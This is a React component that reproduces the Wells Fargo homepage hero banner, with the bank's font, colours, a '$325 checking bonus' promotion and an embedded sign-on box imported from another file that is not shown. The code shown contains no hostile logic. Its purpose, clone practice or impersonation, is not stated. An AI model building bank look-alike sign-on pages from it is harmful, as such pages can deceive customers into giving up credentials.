import SignOnBox from './SignOnBox';

const f = '"Wells Fargo Sans", Arial, Helvetica, sans-serif';

export default function HeroBanner() {
  return (
    <div className="w-full" style={{ backgroundColor: '#f9f7f6' }}>
      <div className="max-w-[1400px] mx-auto wf-section-px" style={{ paddingTop: '32px', paddingBottom: '48px' }}>
        <div className="wf-hero-row">
          {/* Sign-On Box */}
          <div className="wf-hero-signon">
            <SignOnBox />
          </div>

          {/* Hero text */}
          <div className="wf-hero-text">
            <h2 className="wf-hero-h" style={{ fontFamily: f, color: '#141414', margin: '0 0 20px', fontWeight: 400 }}>
              $325 checking bonus on us
            </h2>
            <p className="wf-hero-p" style={{ fontFamily: f, lineHeight: '1.3', color: '#141414', margin: '0 0 4px' }}>
              New customers open an eligible checking account with qualifying direct deposits
            </p>
            <div style={{ padding: '24px 0' }}>
              <a
                style={{
                  display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
                  backgroundColor: '#fff', border: '1px solid #3b3331', color: '#3b3331',
                  borderRadius: '24px', fontFamily: f, fontWeight: 600, fontSize: '1rem',
                  lineHeight: '1.29', padding: '9px 24px', minWidth: '174px',
                  textAlign: 'center', textDecoration: 'none',
                }}
              >
                Get started &gt;&gt;
              </a>
            </div>
          </div>

          {/* Right side promo */}
          <div className="wf-hero-promo">
            <div style={{ width: '180px', height: '3px', backgroundColor: '#C11574', margin: '0 auto 16px' }} />
            <div className="wf-hero-enjoy" style={{ fontFamily: f, color: '#C11574', fontWeight: 400, marginBottom: '4px' }}>
              Enjoy
            </div>
            <div className="wf-hero-amount" style={{ fontFamily: f, color: '#C11574', fontWeight: 300, lineHeight: '1', marginBottom: '16px' }}>
              $325
            </div>
            <div style={{ width: '180px', height: '3px', backgroundColor: '#C11574', margin: '0 auto' }} />
          </div>
        </div>
      </div>
    </div>
  );
}
